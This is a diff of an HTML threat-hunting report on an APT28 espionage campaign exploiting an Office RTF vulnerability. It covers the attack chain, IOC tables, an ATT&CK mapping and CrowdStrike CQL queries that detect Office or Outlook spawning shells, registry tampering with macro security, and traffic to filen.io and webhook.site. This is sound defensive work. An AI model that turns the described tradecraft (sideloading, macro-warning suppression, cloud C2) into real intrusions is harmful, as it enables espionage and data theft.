+        <tr><td>1 · Vendor research</td><td>Picus — CVE-2026-21509 APT28 Office zero-day</td><td>RTF security-feature-bypass mechanism; OOB patch 26 Jan 2026; affected Office versions</td><td><span class="badge b-low">yes</span></td></tr>
+        <tr><td>1 · News / CERT</td><td>The Hacker News / CERT-UA</td><td>60+ Ukrainian government addresses; MiniDoor = stripped NotDoor; Covenant Grunt</td><td><span class="badge b-low">yes</span></td></tr>
+        <tr><td>2 · Vendor</td><td>Hive Pro / Security Affairs</td><td>Operation Neusploit advisory; espionage focus; payload chain</td><td><span class="badge b-med">partial</span></td></tr>
+      </tbody>
+    </table>
+    <p style="margin-top:8px;"><strong>Decisions:</strong> patch-first (CVE-2026-21509 OOB fix closes the exploit); behavior-anchored on the Office-RTF lineage + MiniDoor Outlook-stealer + PixyNetLoader→Covenant Grunt; geopolitically scoped (CEE/Ukraine gov) so relevant orgs run at elevated priority; Covenant is a public framework, so detect its grunt behavior, not a fixed hash.</p>
   </div>
-</section>
+</div>
 
-<!-- HUNT BRIEF -->
-<section id="brief">
-  <h2>Hunt Brief</h2>
-
-  <h3>Identity</h3>
-  <table>
-    <tr><th style="width: 30%">Field</th><th>Value</th></tr>
-    <tr><td>Threat name</td><td>APT28 — PRISMEX campaign / Operation Neusploit</td></tr>
-    <tr><td>Aliases</td><td>Fancy Bear, Forest Blizzard, Pawn Storm, UAC-0001, Sofacy, Strontium</td></tr>
-    <tr><td>Attribution</td><td>Russian GRU 85th Main Special Service Center, Unit 26165 (state-sponsored)</td></tr>
-    <tr><td>First observed (this campaign)</td><td>Infrastructure prep: Jan 12, 2026 — Active exploitation: Jan 29, 2026 — Disclosed by vendors: Feb 4, 2026 (Trellix), Apr 8, 2026 (Trend Micro PRISMEX)</td></tr>
-    <tr><td>Affiliated tooling</td><td>MiniDoor (Outlook email stealer), NotDoor / GONEPOSTAL (Outlook VBA macro backdoor), PrismexSheet (Excel VBA dropper), PrismexDrop (native dropper), PrismexLoader / PixyNetLoader (steganographic loader), PrismexStager (CovenantGrunt over filen.io)</td></tr>
-    <tr><td>Target verticals</td><td>Ukrainian central executive bodies, hydrometeorology, defense, emergency services; NATO partner rail logistics (PL), maritime/transport (RO, SI, TR, GR), ammunition logistics (SK, CZ), defense/diplomatic (UAE)</td></tr>
-    <tr><td>Strategic intent</td><td>Espionage targeting Ukraine's supply chain &amp; allied operational planning, with sabotage capability demonstrated (Oct 2025 wiper incident)</td></tr>
-  </table>
-
-  <h3>Initial Access Vectors</h3>
-  <table>
-    <tr><th>Vector</th><th>CVE / Mechanism</th><th>What lands on the endpoint</th></tr>
-    <tr><td>Spear-phishing RTF</td><td>CVE-2026-21509 — Microsoft Office RCE via crafted RTF. Often chained with CVE-2026-21513 (MSHTML LNK exploit) for security-feature bypass.</td><td>Word/Excel hosts the exploit → PrismexSheet (Excel VBA dropper) or direct PrismexDrop</td></tr>
-    <tr><td>Spear-phishing Office attachment</td><td>VBA macros (when enabled) extract steganographically-hidden payloads from PNG via "Bit Plane Round Robin" algorithm</td><td>PrismexLoader / PixyNetLoader in memory; decoy doc shown (drone inventory / prices)</td></tr>
-    <tr><td>Post-compromise NotDoor staging</td><td>Files staged in <code>C:\ProgramData</code> via prior foothold; <code>OneDrive.exe</code> sideloads malicious <code>SSPICLI.dll</code></td><td>VbaProject.OTM installed in Outlook AppData; persistence + email-triggered C2</td></tr>
-  </table>
-
-  <h3>Multi-stage Chain (typical)</h3>
-  <ol>
-    <li><strong>T+0:</strong> RTF or LNK attachment opens in Word/Excel. CVE-2026-21509 fires; Office hosts the loader.</li>
-    <li><strong>T+0–60s:</strong> <code>PrismexSheet</code> macro decodes steganographic payload from <code>SplashScreen.png</code> via "Bit Plane Round Robin"; reflectively loads <code>PrismexLoader</code> (.NET) in memory.</li>
-    <li><strong>T+60s–5min:</strong> Persistence established via COM hijacking (T1546.015) and scheduled task (T1053.005). Decoy document shown to victim.</li>
-    <li><strong>T+5min+:</strong> <code>PrismexStager</code> (CovenantGrunt variant) begins polling filen.io across 24 subdomains for encrypted task files. C2 channel is HTTPS to legitimate cloud provider — bypasses reputation filtering.</li>
-    <li><strong>T+hours–days:</strong> Operators drop <strong>NotDoor</strong> for redundancy: <code>OneDrive.exe</code> + <code>SSPICLI.dll</code> + <code>tmp7E9C.dll</code> + <code>testtemp.ini</code> staged in <code>C:\ProgramData</code>. Encoded PowerShell copies <code>testtemp.ini</code> to <code>%APPDATA%\Microsoft\Outlook\VbaProject.OTM</code>.</li>
-    <li><strong>Long-haul:</strong> NotDoor monitors inbound email via <code>Application_NewMailEx</code> for trigger words; commands executed via VBA. Registry tampering disables Outlook macro warnings (<code>Level=1</code>) and forces auto-load on boot (<code>LoadMacroProviderOnBoot=1</code>).</li>
-    <li><strong>Optional impact:</strong> CovenantGrunt has been observed running wiper commands erasing <code>%USERPROFILE%</code> (T1485) — dual espionage/sabotage capability.</li>
-  </ol>
-
-  <h3>Endpoint-Observable Indicators (the hunt focus)</h3>
-  <ul>
-    <li><strong>outlook.exe</strong> as parent of <code>cmd.exe</code>, <code>powershell.exe</code>, <code>wscript.exe</code>, <code>cscript.exe</code>, <code>mshta.exe</code>, <code>regsvr32.exe</code>, or <code>rundll32.exe</code></li>
-    <li><strong>winword.exe / excel.exe</strong> hosting child processes after RTF/Excel attachment open (CVE-2026-21509 detonation)</li>
-    <li>File write of <code>VbaProject.OTM</code> to <code>%APPDATA%\Microsoft\Outlook\</code> by any process other than <code>OUTLOOK.EXE</code></li>
-    <li><code>OneDrive.exe</code> running from <code>C:\ProgramData\</code> (legitimate OneDrive lives under <code>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\OneDrive</code>)</li>
-    <li><code>OneDrive.exe</code> as parent of <code>powershell.exe -EncodedCommand</code></li>
-    <li>Registry modification of <code>LoadMacroProviderOnBoot</code>, <code>\Outlook\Security\Level</code>, <code>\Outlook\Options\General\PONT_STRING</code> by any process other than Outlook</li>
-    <li>DNS resolution / HTTPS to <code>*.dnshook.site</code>, <code>webhook.site</code> (NotDoor beacon)</li>
-    <li>HTTPS connections to <code>*.filen.io</code> (24 subdomains: <code>gateway.*</code>, <code>ingest.*</code>, <code>egest.*</code>) from any process other than a sanctioned browser</li>
-    <li>Reflective .NET assembly loads from Office or Outlook process contexts (T1620)</li>
-    <li>Creation of <code>%TEMP%\Test\</code> directory</li>
-  </ul>
-</section>
-
-<!-- MITRE -->
-<section id="mitre">
-  <h2>MITRE ATT&amp;CK Mapping</h2>
-  <pre>
-[Spear-phishing email with RTF/LNK attachment]
-   │
-   │  T1566.001 — Phishing: Spearphishing Attachment
-   ▼
-[winword.exe / excel.exe opens attachment]
-   │
-   │  T1203 — Exploitation for Client Execution (CVE-2026-21509)
-   │  T1059.005 — Visual Basic (PrismexSheet VBA macro)
-   │  T1027 — Obfuscated Files (steganographic PNG payload)
-   ▼
-[PrismexLoader / PixyNetLoader in-memory .NET]
-   │
-   │  T1620 — Reflective Code Loading (.NET assembly)
-   │  T1546.015 — Component Object Model Hijacking (persistence)
-   │  T1053.005 — Scheduled Task (persistence)
-   ▼
-[PrismexStager — CovenantGrunt implant]
-   │
-   │  T1071.001 — Application Layer Protocol: Web (HTTPS to filen.io)
-   │  T1567 — Exfiltration Over Web Service (cloud storage)
-   │  T1568.002 — Dynamic Resolution: 24 filen.io subdomains
-   │  T1059.001 — PowerShell (in-band command execution)
-   │  T1620 — Reflective Code Loading (assembly tasking)
-   │
-   │  ┌─── Optional path: ──┐
-   │  │  T1485 — Data Destruction (wiper on %USERPROFILE%)
-   │  └─────────────────────┘
-   ▼
-[NotDoor — Outlook VBA backdoor (long-haul persistence)]
-   │
-   │  T1574.001 — DLL Search Order Hijacking (OneDrive.exe → SSPICLI.dll)
-   │  T1137.005 — Outlook Rules / Macros (VbaProject.OTM)
-   │  T1112 — Modify Registry (LoadMacroProviderOnBoot, Security\Level, PONT_STRING)
-   │  T1027.010 — Command Obfuscation (encoded PowerShell)
-   ▼
-[Email-triggered C2 via Application_NewMailEx event handler]
-  </pre>
-
-  <table>
-    <tr><th>Tactic</th><th>Technique</th><th>Sub-technique / Detail</th><th>Hunt Q</th></tr>
-    <tr><td>Initial Access</td><td>T1566.001</td><td>Spearphishing Attachment (RTF / Excel)</td><td>Q8</td></tr>
-    <tr><td>Execution</td><td>T1203</td><td>CVE-2026-21509 in Word/Excel</td><td>Q8</td></tr>
-    <tr><td>Execution</td><td>T1059.005</td><td>VBA (PrismexSheet / NotDoor)</td><td>Q1, Q2</td></tr>
-    <tr><td>Execution</td><td>T1059.001 / T1027.010</td><td>Encoded PowerShell (NotDoor staging)</td><td>Q6, Q7</td></tr>
-    <tr><td>Execution</td><td>T1620</td><td>Reflective .NET (PrismexLoader, Stager)</td><td>Q4 (correlate)</td></tr>
-    <tr><td>Persistence</td><td>T1137.005</td><td>VbaProject.OTM (Outlook macro)</td><td>Q2</td></tr>
-    <tr><td>Persistence</td><td>T1546.015</td><td>COM Hijacking (PrismexDrop)</td><td>(IOA)</td></tr>
-    <tr><td>Persistence</td><td>T1053.005</td><td>Scheduled Task (PrismexDrop)</td><td>(IOA)</td></tr>
-    <tr><td>Defense Evasion</td><td>T1574.001</td><td>DLL Sideload (OneDrive → SSPICLI.dll)</td><td>Q3</td></tr>
-    <tr><td>Defense Evasion</td><td>T1112</td><td>Outlook macro registry tampering</td><td>Q4</td></tr>
-    <tr><td>Defense Evasion</td><td>T1027</td><td>Steganography (PNG payload)</td><td>(host artifact)</td></tr>
-    <tr><td>Command &amp; Control</td><td>T1071.001</td><td>HTTPS to filen.io (legit cloud)</td><td>Q5</td></tr>
-    <tr><td>Command &amp; Control</td><td>T1568.002</td><td>24 filen.io subdomains</td><td>Q5</td></tr>
-    <tr><td>Exfiltration</td><td>T1567</td><td>Cloud storage as exfil + C2 channel</td><td>Q5</td></tr>
-    <tr><td>Impact (optional)</td><td>T1485</td><td>Wiper on %USERPROFILE%</td><td>(separate hunt)</td></tr>
-  </table>
-</section>
-
-<!-- QUERIES -->
-<section id="queries">
-  <h2>CQL Hunt Queries</h2>
-  <div class="callout">
-    Every query below has a <strong>Copy</strong> button and an <strong>Open in Falcon</strong> button that uses the cloud you picked above.
-    Run them over the last 7–30 days first (per <em>TIMEFRAME</em>), tune the FP notes for your environment, and validate
-    before promoting any associated IOAs to Prevent mode. Recommended order: <strong>Q2 → Q1 → Q5 → Q3 → Q6 → Q7 → Q4 → Q8</strong>.
+<div class="section" id="s3">
+  <div class="section-hdr"><span class="snum">03</span><h2>Hunt Brief &amp; Attack Chain</h2></div>
+  <div class="section-body">
+    <p><strong>Working hypothesis:</strong> A user opens a phishing RTF/Word; CVE-2026-21509 triggers a dropper that installs MiniDoor (Outlook email theft) and PixyNetLoader, which loads a Covenant Grunt for hands-on espionage and exfil via filen.io.</p>
+    <table>
+      <thead><tr><th>Step</th><th>Behavior</th><th>Telemetry</th><th>Hunt Angle</th></tr></thead>
+      <tbody>
+        <tr><td>1 · Phishing</td><td>RTF/Word attachment to gov/high-value targets</td><td>Mail gateway</td><td>N1</td></tr>
+        <tr><td>2 · Exploit</td><td>CVE-2026-21509 RTF bypass → dropper executes</td><td><code>ProcessRollup2</code></td><td><strong>Q1</strong>; patch</td></tr>
+        <tr><td>3 · MiniDoor</td><td>Outlook email stealer (NotDoor variant) installed/persisted</td><td>registry; Outlook VBA; proc</td><td><strong>Q3</strong>; N3</td></tr>
+        <tr><td>4 · PixyNetLoader</td><td>"PRISMEX" loader stages the next implant</td><td><code>ProcessRollup2</code>; file</td><td><strong>Q2 / Q4</strong></td></tr>
+        <tr><td>5 · Covenant Grunt</td><td>Covenant C2 implant for hands-on control</td><td><code>ProcessRollup2</code>; net</td><td><strong>Q4 / Q5</strong></td></tr>
+        <tr><td>6 · Exfil</td><td>Email/data exfil (filen.io staging)</td><td><code>NetworkConnectIP4</code>; DNS</td><td><strong>Q5</strong>; N4</td></tr>
+      </tbody>
+    </table>
+    <h4>Affected surface &amp; telemetry</h4>
+    <table>
+      <thead><tr><th>Surface</th><th>Required Telemetry</th><th>Priority</th><th>Gap Risk</th></tr></thead>
+      <tbody>
+        <tr><td>Office (RTF) endpoints</td><td>Process lineage; Office version inventory</td><td><span class="badge b-high">Critical</span></td><td>Low — patch + lineage</td></tr>
+        <tr><td>Outlook (MiniDoor)</td><td>Outlook VBA / registry; mail-client behavior</td><td><span class="badge b-high">High</span></td><td>Medium — VBA/registry telemetry</td></tr>
+        <tr><td>Loader / Covenant C2</td><td>Process lineage + egress</td><td><span class="badge b-high">High</span></td><td>Medium — Covenant is generic</td></tr>
+        <tr><td>Mail / exfil</td><td>Mail gateway; proxy (filen.io)</td><td><span class="badge b-med">Medium</span></td><td>Medium — staging service</td></tr>
+      </tbody>
+    </table>
   </div>
+</div>
 
-  <!-- Q1 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q1</span> Outlook spawning script interpreters (NotDoor / PrismexSheet child)</div>
-      <div>
-        <span class="badge good">FP RISK: LOW</span>
-        <span class="badge good">CONF: HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1059.001 / T1059.005 / T1059.003</div>
-      <div><strong>Timeframe:</strong> Last 14 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> NotDoor's VBA macro and PrismexSheet macros call out to <code>cmd.exe</code>, <code>powershell.exe</code>, <code>wscript.exe</code>, <code>cscript.exe</code>, <code>mshta.exe</code>, or <code>rundll32.exe</code> from the Outlook process context. With default Office hardening this should essentially never happen in enterprise environments.</p>
-      <p><strong>FP Notes:</strong> Legitimate Outlook add-ins occasionally shell out (rare; vendor-signed). Allow-list specific signer/publisher AIDs after triage.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q1" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q1">// HUNT: APT28 PRISMEX / NotDoor - T1059.001/T1059.005 - Outlook child interpreters
-// HYPOTHESIS: NotDoor VBA macro and PrismexSheet drop scripts via outlook.exe → script host.
-// FP RISK: Low - hardened Office should rarely spawn interpreters from Outlook context.
-// FP NOTES:
-//   - Vendor-signed Outlook plugins (allow-list publisher/AID after triage)
-//   - Some legacy LOB add-ins shell out — document and allow-list
-// CONFIDENCE: High - direct execution-stage signal for the chain
-// TIMEFRAME: Last 14 days
-
-#event_simpleName = /ProcessRollup2|SyntheticProcessRollup2/
-| ParentBaseFileName = /^outlook\.exe$/i
-| in(field=FileName, values=["cmd.exe","powershell.exe","powershell_ise.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe"], ignoreCase=true)
-| table([@timestamp, aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
+<div class="section" id="s4">
+  <div class="section-hdr"><span class="snum">04</span><h2>Consolidated IOC Table</h2></div>
+  <div class="section-body">
+    <div class="callout callout-warn">The patch closes the exploit; payloads/infra rotate. Behavior (Office-RTF lineage, Outlook-stealer, loader→Covenant) is durable. Copy-ready blocks in §9.</div>
+    <table>
+      <thead><tr><th>Type</th><th>Value</th><th>Conf</th><th>Action</th><th>Context</th></tr></thead>
+      <tbody>
+        <tr><td>CVE</td><td class="mono">CVE-2026-21509 (Office RTF) — patched 26 Jan 2026</td><td><span class="badge b-high">high</span></td><td>detect</td><td>Patch closes it</td></tr>
+        <tr><td>Behavior</td><td class="mono">Office (winword/RTF) spawning a dropper / unusual child</td><td><span class="badge b-high">high</span></td><td>detect</td><td>Exploit outcome — flagship</td></tr>
+        <tr><td>Malware</td><td class="mono">MiniDoor (NotDoor variant) — Outlook email stealer</td><td><span class="badge b-med">medium</span></td><td>hunt</td><td>Outlook persistence/exfil</td></tr>
+        <tr><td>Malware</td><td class="mono">PixyNetLoader ("PRISMEX") → Covenant Grunt</td><td><span class="badge b-med">medium</span></td><td>hunt</td><td>Loader → C2 implant</td></tr>
+        <tr><td>Network</td><td class="mono">filen.io staging/exfil; Covenant Grunt HTTP C2</td><td><span class="badge b-med">medium</span></td><td>hunt</td><td>C2 / exfil</td></tr>
+      </tbody>
+    </table>
   </div>
+</div>
 
-  <!-- Q2 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q2</span> VbaProject.OTM written by non-Outlook process (NotDoor persistence)</div>
-      <div>
-        <span class="badge good">FP RISK: LOW</span>
-        <span class="badge good">CONF: HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1137.005</div>
-      <div><strong>Timeframe:</strong> Last 30 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+ (file events)</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> The Outlook macro file <code>VbaProject.OTM</code> is only ever written by <code>OUTLOOK.EXE</code> itself when a user authors a macro. Any other writer is high-confidence Outlook-macro persistence implant activity (NotDoor and variants).</p>
-      <p><strong>FP Notes:</strong> Backup / DLP agents that snapshot the AppData tree may show as "writers" depending on telemetry shape — verify the writer process is actually creating a new file, not just reading-and-recopying.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q2" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q2">// HUNT: APT28 NotDoor - T1137.005 - VbaProject.OTM creation by non-Outlook process
-// HYPOTHESIS: VbaProject.OTM is the Outlook macro store. Only outlook.exe legitimately
-//             creates/modifies it. Any other writer = Outlook-macro persistence implant.
-// FP RISK: Low - file path is highly specific
-// FP NOTES:
-//   - Backup/DLP agents that snapshot AppData (validate they're not actually writing)
-//   - Imaging / profile sync processes (allow-list service accounts after triage)
-// CONFIDENCE: High - this is the strongest single-pane signal in this pack
-// TIMEFRAME: Last 30 days
-
-#event_simpleName = /FileWritten|NewFileCreation/
-| TargetFileName = /\\AppData\\Roaming\\Microsoft\\Outlook\\VbaProject\.OTM$/i
-| !ContextBaseFileName = /^outlook\.exe$/i
-| table([@timestamp, aid, ComputerName, UserName, ContextBaseFileName, ContextImageFileName, TargetFileName, SHA256HashData])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
+<div class="section" id="s5">
+  <div class="section-hdr"><span class="snum">05</span><h2>ATT&amp;CK Mapping</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Tactic</th><th>Technique</th><th>Observed Behavior</th><th>Query / Control</th></tr></thead>
+      <tbody>
+        <tr><td>Initial Access</td><td>T1566.001 — Spearphishing Attachment</td><td>Phishing RTF/Word to gov targets</td><td>N1</td></tr>
+        <tr><td>Execution</td><td>T1203 — Exploitation for Client Execution</td><td>CVE-2026-21509 RTF bypass</td><td>Q1; patch</td></tr>
+        <tr><td>Persistence / Collection</td><td>T1137 / T1114 — Office persistence / email collection</td><td>MiniDoor Outlook stealer</td><td>Q3; N3</td></tr>
+        <tr><td>Execution / Defense Evasion</td><td>T1574 / T1620 — Loader / in-memory load</td><td>PixyNetLoader stages Covenant Grunt</td><td>Q2, Q4</td></tr>
+        <tr><td>Command &amp; Control</td><td>T1071.001 — Web protocols (Covenant)</td><td>Covenant Grunt HTTP C2</td><td>Q4, Q5</td></tr>
+        <tr><td>Exfiltration</td><td>T1567.002 — Exfil to cloud (filen.io)</td><td>Email/data exfil via staging service</td><td>Q5; N4</td></tr>
+      </tbody>
+    </table>
   </div>
+</div>
 
-  <!-- Q3 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q3</span> OneDrive.exe running from <code>C:\ProgramData\</code> (sideload tell)</div>
-      <div>
-        <span class="badge good">FP RISK: LOW</span>
-        <span class="badge good">CONF: HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1574.001</div>
-      <div><strong>Timeframe:</strong> Last 30 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> NotDoor stages a legitimate <code>OneDrive.exe</code> in <code>C:\ProgramData\</code> so it sideloads a malicious <code>SSPICLI.dll</code> from the same directory. Legitimate OneDrive lives under each user's <code>AppData\Local\Microsoft\OneDrive\</code>. ProgramData OneDrive is an artifact-level smoking gun.</p>
-      <p><strong>FP Notes:</strong> Some enterprise IT scripts copy OneDrive installers to <code>C:\ProgramData\</code> temporarily; verify it isn't a transient staging file and that nothing is loaded from that path.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q3" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q3">// HUNT: APT28 NotDoor - T1574.001 - OneDrive.exe DLL sideload from ProgramData
-// HYPOTHESIS: NotDoor stages legitimate OneDrive.exe in C:\ProgramData so it sideloads
-//             a malicious SSPICLI.dll from the same dir. Real OneDrive lives in user AppData.
-// FP RISK: Low - artifact path is very specific to this technique
-// FP NOTES:
-//   - Some IT scripts may transiently stage OneDrive installer in ProgramData
-//   - Verify the executable is actively running (not just dropped and removed)
-// CONFIDENCE: High - paired with Q6 (encoded PS from OneDrive parent) it's near-certain
-// TIMEFRAME: Last 30 days
-
-#event_simpleName = /ProcessRollup2|SyntheticProcessRollup2/
-| ImageFileName = /\\ProgramData\\(.*\\)?OneDrive\.exe$/i
-| !ImageFileName = /\\Users\\[^\\]+\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive\.exe$/i
-| table([@timestamp, aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName, SHA256HashData])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
+<div class="section" id="s6">
+  <div class="section-hdr"><span class="snum">06</span><h2>Native Audit-Log Hunts</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Hunt</th><th>Source</th><th>Logic</th><th>Response</th></tr></thead>
+      <tbody>
+        <tr><td>N1 · Phishing RTF</td><td>Mail gateway</td><td>RTF/Word attachments to executive/government mailboxes; CEE/Ukraine-themed lures</td><td>Quarantine + detonate; warn recipients</td></tr>
+        <tr><td>N2 · Office patch inventory</td><td>Software inventory</td><td>Office builds missing the 26 Jan 2026 OOB fix for CVE-2026-21509</td><td>Force-patch; the fix</td></tr>
+        <tr><td>N3 · Outlook persistence</td><td>Outlook VBA / registry (LoadMacroProviderOnBoot, VbaProject.OTM)</td><td>Unexpected Outlook VBA project / startup macros (MiniDoor)</td><td>Remove; investigate mailbox</td></tr>
+        <tr><td>N4 · Covenant / filen.io egress</td><td>Proxy / DNS</td><td>Covenant Grunt HTTP C2 patterns; connections to <code>filen.io</code></td><td>Block; identify the host</td></tr>
+      </tbody>
+    </table>
   </div>
+</div>
 
-  <!-- Q4 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q4</span> Outlook macro security registry tampering</div>
-      <div>
-        <span class="badge warn">FP RISK: MEDIUM</span>
-        <span class="badge info">CONF: MEDIUM-HIGH</span>
+<div class="section" id="s7">
+  <div class="section-hdr"><span class="snum">07</span><h2>CrowdStrike LogScale CQL Hunt Queries</h2></div>
+  <div class="section-body">
+    <div class="cloud-sel">
+      <label for="cloud-region">Falcon cloud (drives "Open in Falcon"):</label>
+      <select id="cloud-region">
+        <option value="https://falcon.crowdstrike.com">US-1</option>
+        <option value="https://falcon.us-2.crowdstrike.com">US-2</option>
+        <option value="https://falcon.eu-1.crowdstrike.com">EU-1</option>
+        <option value="https://falcon.laggar.gcw.crowdstrike.com">US-GOV-1</option>
+        <option value="https://falcon.us-gov-2.crowdstrike.mil">US-GOV-2</option>
+      </select>
+    </div>
+    <div class="callout callout-info">Field names validated against the Falcon event reference; process hunts include <code>SyntheticProcessRollup2</code>. CEE/Ukraine-government orgs should run at elevated priority. Covenant is a public framework — tune Q4/Q5 to your environment.</div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q1 · Office application spawning a dropper / unusual child</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-med">FP LOW-MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql1',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql1')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Word/Office spawning shells/loaders/LOLBins (CVE-2026-21509 exploit outcome). <strong>Accomplishes:</strong> catches the RTF-exploit chain. <strong>FP:</strong> some macro-enabled docs — flag non-Office children + RTF context.</p>
+<pre class="cql" id="cql1"><span class="cm">// HUNT: APT28 Office RTF exploit lineage (CVE-2026-21509)</span>
+<span class="cm">// MITRE: T1203, T1566.001 | CONF: high  FP: low-med  COST: low</span>
+<span class="cm">// FP NOTES: macro-enabled docs; flag winword spawning shells/loaders, esp. from .rtf</span>
+#event_simpleName=/ProcessRollup2|SyntheticProcessRollup2/
+| ParentBaseFileName=/^(winword|excel|powerpnt|wordview)\.exe$/i
+| FileName=/^(cmd|powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32|msiexec|certutil|curl)\.exe$/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])</pre>
       </div>
     </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1112 + T1137.005</div>
-      <div><strong>Timeframe:</strong> Last 14 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+ (registry events)</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> NotDoor sets <code>LoadMacroProviderOnBoot=1</code>, <code>\Outlook\Security\Level=1</code> (enable all macros, no prompts), and modifies <code>PONT_STRING</code> to suppress Outlook dialogs. Any tampering with these specific values by a non-Outlook process is suspect.</p>
-      <p><strong>FP Notes:</strong> Sysadmin GPO rollouts. Allow-list the Group Policy client and Intune MDM AIDs. Defender/compliance tools that audit/correct these values.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q4" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q4">// HUNT: APT28 NotDoor - T1112 - Outlook macro security registry tampering
-// HYPOTHESIS: NotDoor weakens Outlook macro controls and suppresses dialogs via registry.
-// FP RISK: Medium - sysadmin GPO and Intune MDM legitimately touch these keys
-// FP NOTES:
-//   - GPO Client (svchost contexts), Intune Management Extension — allow-list AIDs
-//   - Defender ASR audit-mode events — they can READ but should not WRITE to enable=1
-// CONFIDENCE: Medium-High - paired with Q2 it's a confirmation, not a primary signal
-// TIMEFRAME: Last 14 days
 
-#event_simpleName = /RegistryValueUpdate|AsepValueUpdate/
-| (RegObjectName = /\\Software\\Microsoft\\Office\\[^\\]+\\Outlook\\Security/i and RegStringValue = /^1$/i and RegValueName = /^Level$/i)
-   or (RegObjectName = /\\Software\\Microsoft\\Office\\[^\\]+\\Outlook$/i and RegValueName = /^LoadMacroProviderOnBoot$/i and RegStringValue = /^1$/i)
-   or (RegObjectName = /\\Software\\Microsoft\\Office\\[^\\]+\\Outlook\\Options\\General$/i and RegValueName = /^PONT_STRING$/i)
-| !ContextBaseFileName = /^(outlook\.exe|setup\.exe|excelcnv\.exe)$/i
-| table([@timestamp, aid, ComputerName, UserName, ContextBaseFileName, RegObjectName, RegValueName, RegStringValue])
-| sort(@timestamp, order=desc)</pre>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q2 · Dropper writing a loader to a user path</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql2',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql2')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a PE written to <code>%TEMP%</code>/<code>%AppData%</code> by an Office-spawned process (PixyNetLoader / MiniDoor drop). <strong>FP:</strong> correlate with Q1 on the same host.</p>
+<pre class="cql" id="cql2"><span class="cm">// HUNT: APT28 dropper writing PixyNetLoader/MiniDoor to a user path</span>
+<span class="cm">// MITRE: T1105, T1574 | CONF: medium  FP: medium  COST: low</span>
+<span class="cm">// TUNING: correlate to Q1 (Office-spawned); flag PE/dll writes to %TEMP%/%AppData%</span>
+#event_simpleName=/PeFileWritten|NewExecutableWritten/
+| ContextBaseFileName=/^(winword|cmd|powershell|mshta|rundll32)\.exe$/i
+| TargetFileName=/\\(Temp|AppData)\\.+\.(exe|dll)$/i
+| table([@timestamp, ComputerName, UserName, ContextBaseFileName, TargetFileName, SHA256HashData])</pre>
       </div>
     </div>
-  </div>
 
-  <!-- Q5 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q5</span> Outbound DNS / HTTPS to <code>*.filen.io</code> from non-browser process</div>
-      <div>
-        <span class="badge warn">FP RISK: MEDIUM</span>
-        <span class="badge good">CONF: HIGH</span>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q3 · MiniDoor Outlook-stealer persistence</span>
